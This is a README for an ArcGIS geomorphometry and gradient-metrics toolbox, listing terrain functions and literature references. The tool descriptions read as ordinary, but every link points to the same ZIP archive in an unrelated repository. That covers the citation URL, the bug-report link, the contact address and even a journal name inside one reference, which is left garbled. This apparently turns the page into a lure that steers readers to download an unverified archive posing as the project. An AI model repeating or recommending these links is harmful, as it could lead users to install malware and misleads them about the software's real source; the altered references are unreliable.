# GradientMetrics
ArcGIS Geomorphometry &amp; Gradient Metrics toolbox

The toolbox has been updated (01-08-2018), by Shaun Walbridge with ESRI, to be compatible with Python 3 and ArcGIS Pro and is still backwards compatible with Python 2.7 and ArcGIS 10.x. 

Please cite the toolbox as:

Evans JS, Oakleaf J, Cushman SA (2014) An ArcGIS Toolbox for Surface Gradient and Geomorphometric Modeling, version 2.0-0. URL: https://raw.githubusercontent.com/bharath738/GradientMetrics/master/sinarquista/GradientMetrics.zip Accessed: Year-Month-Date.

We have a paper in preparation but are waiting until I am finished with an analogous open source option as well. I am currently working on a R package that uses SAGA for the raster processing engine. The SAGA option has the smallest footprint from a software standpoint. Many of the metrics available in this toolbox are also available in the spatialEco R package, using the raster package for the raster processing.      

**Bugs**: Users are encouraged to report bugs here. Go to [issues](https://raw.githubusercontent.com/bharath738/GradientMetrics/master/sinarquista/GradientMetrics.zip) in the menu above, and press new issue to start a new bug report, documentation correction or feature request. You can direct questions to <https://raw.githubusercontent.com/bharath738/GradientMetrics/master/sinarquista/GradientMetrics.zip>.

# Available Functions

**Directionality**

*Classify Aspect* - (integer) Classifies aspect into discrete classes.

*Linear Aspect* - (float) - Transforms circular aspect to a linear variable.
 
*Mean Slope* - (float) Mean of slope within a defined window.

**Statistics**

*Correlation/Covariance* - (float) Calculates correlation or covariance between two [x,y] rasters.

*Deviation from Trend* - Deviation in local window, from a polynomial trend. Allows for detrending the raster as well.

*Gaussian Smoothing* - Smooths raster data using a Gaussian kernel

*Invert raster* - (float) inverts (flips) the values of a float raster.

*Local Deviation from Global* - Calculated the local deviation from a global mean or median

*Moments* - (float) Calculates statistical moments of a distribution within a specified window with options for: mean, median, mad, variance, standard deviation, skewness, kurtosis, coefficient of variation. Future release(s) will also have skewness and kurtosis.
 
*Normal* - (float) Creates a grid of random Gaussian distributed values where mean and standard deviation can be defined (default mean is 0 and standard deviation is 1).
 
*Slope Impedance* – (float) A sigmoidal function for an impedance slope function.

*Soble Gradient* - Derives the intensity or direction of a Soble kernel

*Transformations* – (float) Applies statistical transformations. Includes; “standardize” - standardizes values to a mean of 0 and standard deviation of 1; “stretch” – stretches data to specified range; “normalize" - normalizes to a scale 0-1 while retaining
distribution shape: Natural logarithmic; and Square-root.​

**Surface Texture**

*Dissection* - (float) Dissection describes dissection in a continuous raster surface within rectangular or circular window. Martonne’s modified dissection is calculated as:
d=( z - z(min)) / (z(max) - z(min) )

*Landform* - Concavity/convexity landform index (Bolstad’s variant). 
 
*Roughness* - (float) represents the roughness in a continuous raster within a specified window.

*Slope Position* - (float) calculates scalable slope position by subtracting a focalmean raster from the original elevation raster.
Surface/Area Ratio - (float) The Berry (2002) method for surface/area ratio.

*Surface Area Ratio* - The Berry (2002) method for surface/area ratio.
 
*Surface Relief Ratio* - (float) describes rugosity in an continuous raster surface within a specified window. The implementation of SRR can be shown as: srr=( z(mean) - z(min)) / (z(max) - z(min) )
  
**Temperature and Moisture**

*2nd Derivative Slope* - (float) Calculates 2nd derivate of slope.
 
*Compound Topographic Index (CTI)* - (float) is a steady state wetness index. The CTI is a function of both the slope and the upstream contributing area per unit width orthigonal to the flow direction. The implementation of CTI can be shown as: CTI=ln (As / (tan (beta)) where; As=Area Value calculated as (flow accumulation + 1 ) * (pixel area in m2) and beta is the slope expressed in radians.
  
*Heat load index (HLI)* - (float) A southwest facing slope should have warmer temperatures than a southeast facing slope, even though the amount of solar radiation they receive is equivalent. The McCune and Keon (2002) method accounts for this by "folding" the aspect so that the highest values are southwest and the lowest values are northeast. Additionally, this method account for steepness of slope, which is not addressed in most other aspect rescaling equations.

*Integrated Moisture Index* - Calculates an integrated moisture index (Iverson et al. 1997)

*Site Exposure Index* - Calculates a site exposure index (Balice et al. 2000)  

*Slope/Aspect Transformations* - (float). Options are Stage’s (1976) COS, SIN; or Roberts & Cooper (1989) TRASP (topographic radiation aspect index).

   *COS AND SIN* - An a priori assumption of a maximum in the NW quadrant (45 azimuth) and a minimum in the SW quadrant can be replaced by    an empirically determined location of the optimum (Stage, 1976). For slopes from 0% - 100%, the functions are linearized and bounded from -1 to 1. Greater than 100% slopes are treated out of the -1 to 1 range and the model sets all values greater than 100% to 101% and flat areas (-1) to nodata.
 
   *TRASP* - Circular aspect is transformed to assign a value of zero to land oriented in a north- northeast direction, (typically the coolest and wettest orientation), and a value of one on the hotter, dryer south-southwesterly slopes. The result is a continuous variable between 0 - 1 (Roberts and Cooper 1989).

**Utilities**

*Angle conversion* - (float) converts between degrees and radians.
 
*Class Percent* - (float) Calculates the percent of a class in an integer raster within a specified window.
 
*Missing Data Fill* - Fills in NoData gaps using a specified FocalMedian, FocalMean (for float data) or FocalMajority (for integer data) window.
 
*Sieve* - (integer) Smoothes discrete data using a sieve approach. User defines minimal number of cells to be retained. Much more controllable and stable then FocalMajority. Easy way to establish a minimal mapping unit.


**References**

Berry, J. K. 2002. Use surface area for realistic calculations. Geoworld 15(9): 20–1.

Blaszczynski, J.S., (1997) Landform characterization with Geographic Information Systems. Photogrammetric Engineering and Remote Sensing, 63(2):183-191.

Bolstad, P.V., and T.M. Lillesand. (1992). Improved classification of forest vegetation in northern Wisconsin through a rule-based combination of soils, terrain, and LandsatTM data. Forest Science. 38(1): 5-20.

Evans, I. S., 1972. General geomorphometry, derivatives of altitude, and descriptive statistics. In Chorley, R. J., Spatial Analysis in Geomorphology New York: Harper & Row pp.17 – 90.

Gessler, P.E., I.D. Moore, N.J. McKenzie, and P.J. Ryan. (1995). Soil-landscape modeling and spatial prediction of soil attributes. International Journal of GIS. 9(4):421-432.

McCune, Bruce and Dylan Keon, 2002. Equations for potential annual direct incident radiation and heat load index. Journal of Vegetation Science. 13:603-606.

McNab, H.W. (1989) Terrain shape index: quantifying effect of minor landforms on tree height. Forest Science. 35(1): 91-104.

McNab, H.W. (1993). A topographic index to quantify the effect of mesoscale landform on site productivity. Canadian Journal of Forest Research. 23:1100-1107. 

Moore, ID., P.E. Gessler, G.A. Nielsen, and G.A. Petersen (1993) Terrain attributes: estimation methods and scale effects. In Modeling Change in Environmental Systems, edited by A.J. Jakeman M.B. Beck and M. McAleer Wiley , London, pp. 189-214.

Pike, R.J., S.E. Wilson (1971). Elevation relief ratio, hypsometric integral, and geomorphic area altitude analysis. Bull. Geol.   https://raw.githubusercontent.com/bharath738/GradientMetrics/master/sinarquista/GradientMetrics.zip 82:1079-1084

Riley, S. J., S. D. DeGloria and R. Elliot (1999). A terrain ruggedness index that quantifies topographic heterogeneity. Intermountain Journal of Sciences, 5:1-4

Roberts. D. W., and Cooper, S. V., 1989. Concepts and techniques of vegetation mapping. In Land Classifications Based on Vegetation: Applications for Resource Management. USDA Forest Service GTR INT-257, Ogden, UT, pp 90-96

Stage, A. R. 1976. An Expression of the Effects of Aspect, Slope, and Habitat Type on Tree Growth. Forest Science 22(3):457-460. 


